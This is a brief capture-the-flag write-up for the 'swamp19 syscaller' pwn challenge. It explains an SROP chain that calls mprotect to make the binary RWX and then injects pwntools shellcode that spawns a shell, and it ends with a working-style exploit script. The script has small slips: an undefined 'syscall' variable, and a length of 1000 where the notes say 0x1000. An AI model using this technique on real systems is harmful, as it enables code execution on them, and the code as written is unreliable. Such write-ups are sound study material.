- `checks`
  ![[swamp19_syscaller_nightmare-1.png]]
- disassemble:
  ![[swamp19_syscaller_nightmare-2.png]]
- there are 4 syscalls, `write()`, `read()`, syscall to set and `exit()`
- NX off, no PIE, lack of gadgets -> [[SROP]] + [[ret2shellcode]]
- vmmap:
  ![[swamp19_syscaller_nightmare-3.png]]
- first, we will call `sigreturn`: rax = 0xf
- since no PIE, but cant leak libc addr, binary cant be written -> remap binary to rwx using `mprotect()`
- to call `mprotect`:
  rax = 0xa
  rdi = <binary_start_addr> = 0x400000
  rsi = len = 0x1000
- after that, jump back to read to input shellcode -> rip = `syscall` = 0x400104
- and we want to jump straight to shellcode after `read()`, which means rsp = start of shellcode
- notice `read()`, we have `mov rsi, rsp` -> buff addr = rsi = rsp, so we need to set rsp for buff / shellcode.
- after second `syscall (read)`, program still runs next instruction, so we will set buff addr = next instruction after syscall -> rsp = 0x40011a
- payload:
  ```python
	call = 0x0000000000400104
	frame = SigreturnFrame()
	frame.rip = syscall
	frame.rax = 0xa
	frame.rdi = 0x400000
	frame.rdx = 7
	frame.rsi = 1000
	frame.rsp = 0x40011a
	
	payload = flat(
		cyclic(24),
		0xf,
		cyclic(32),
		bytes(frame)
	)
	
	p.sendafter(b' or perish.\n', payload)
	input("enter")
	shellcode = asm(shellcraft.sh())
	p.send(shellcode)
  ```